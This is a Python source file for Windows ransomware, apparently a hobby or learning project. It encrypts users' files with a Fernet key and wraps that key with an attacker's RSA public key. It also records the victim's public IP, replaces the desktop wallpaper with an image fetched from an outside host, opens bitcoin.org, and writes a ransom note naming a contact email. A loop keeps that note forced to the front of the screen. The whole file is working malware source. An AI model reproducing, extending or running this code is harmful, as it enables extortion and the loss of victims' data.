from cryptography.fernet import Fernet # encrypt or decrypt files on users system
import os # to get system root
import webbrowser # to load webbrowser to go to specific website for payments
import ctypes # we can change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get reqeust to api.ipify.org to get users machine ip 
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # for notepad to  open ransom note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # used for ransom note and decryption key on desktop

class RansomWare:

    
    # file exstensions to encrypt
    file_exts = [
        'txt',
       # only encrypts the type of files here
        

    ]


    def __init__(self):
        # key that will be used for Fernet object and encrypt/decrypt method
        self.key = None
        # encrypt or decrypter
        self.crypter = None
        # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.public_key = None

        #root directorys to start encryption
        # use sysroot to create path for files
        self.sysRoot = os.path.expanduser('~')
        # use localroot to test encryption software and for  path for files and encryption of test system
        self.localRoot = r'D:\coding\Python\RansomWare\ransomWare_software\localroot' # Debugging/Testing

        # get  ip of person,cause why not lmao
        self.publicIP = requests.get('https://api.ipify.org').text


    # generates symmetric key on victim machine which is used to encrypt the victims data
    def generate_key(self):
        # generates a url safe(base64 encoded) key
        self.key =  Fernet.generate_key()
        # creates a fernet object with encrypt or decrypt methods
        self.crypter = Fernet(self.key)

    
    # write the fernet(symmetric key) to text file
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)


    # encrypt symmetric key that was created on users machine to encrypt or decrypt files with our public asysmetric 
    # RSA key that was created on local machine.decrypt the symmetric key used for encrypt or decrypt files on user with private key
    # so that they can then decrypt files 
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # public RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # write encrypted fernet key to file
            f.write(enc_fernent_key)
        # write encrypted fernet key to dekstop so they can send this file to be unencrypted and get files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # remove fernet crypter object
        self.crypter = None


    # symmetic key fernet encrypt or Decrypt file file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # read data from file
            data = f.read()
            if not encrypted:
                # print file contents mainly for debug
                print(data)
                # encrypt data from file
                _data = self.crypter.encrypt(data)
                # log file encrypted and print encrypted contents mainly for debug again
                print('> File encrpyted')
                print(_data)
            else:
                # decrypt data from file
                _data = self.crypter.decrypt(data)
                # log file decrypted and print decrypted contents debug
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # write encrypted or decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # symmetric fernet encrypt or decrypt files on system using the symmetric key that was generated on user machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    # open webbrozer to bitcoin website for actual serios
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        # bitcoin payments cause cannot be tracked 
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
        # go to specific url and download+save image using path
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'email the file called EMAIL_me.txt at {self.sysRoot}Desktop/EMAIL_ME.txt to GetYourFilesBack@protonmail.com')


    def show_ransom_note(self):
        # open the ransom note
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 # Debugging/Testing
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('ransom note is the top window - do nothing') # debugging
                pass
            else:
                print('ransom note is not the top window - kill process again') # Debugging
                #kill ransom note so we can open it again and make sure ransom note is in top of all windows
                time.sleep(0.1)
                ransom.kill()
                # open the ransom note
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            # sleep for 10 sec
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    
    # decrypts system when text file with unencrypted key in it is placed on dekstop of target machine
    def put_me_on_desktop(self):
        # loop to check file and if file it will read key and self.key + self.cryptor will be valid for decrypting the files
        print('started') # debugging
        while True:
            try:
                print('trying') # Debugging
                # 1. i decrypts the fernet symmetric key on their machine and then puts the unencrypted fernet key in this file and sends it in a email to user
                # 2.key in this file and sends it in a email to user they then put this on the desktop and it will be
                # 3.they then put this on the desktop and it will be used to unencrypt the system
                #never give them the private symmetric key
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    # decrypt system once have file is found and we have cryptor with the correct key
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging
                    break
            except Exception as e:
                print(e) # Debugging
                pass
            time.sleep(10) # Debugging checking for file on desktop ever 10 sec
            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging
            


def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> ransomWare: Attack completed on target machine and system is encrypted') # debugging
    print('> ransomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # debugging
    t2.start()
    print('> ransomWare: Target machine has been un-encrypted') # debugging
    print('> ransomWare: Completed') # debugging



if __name__ == '__main__':
    main()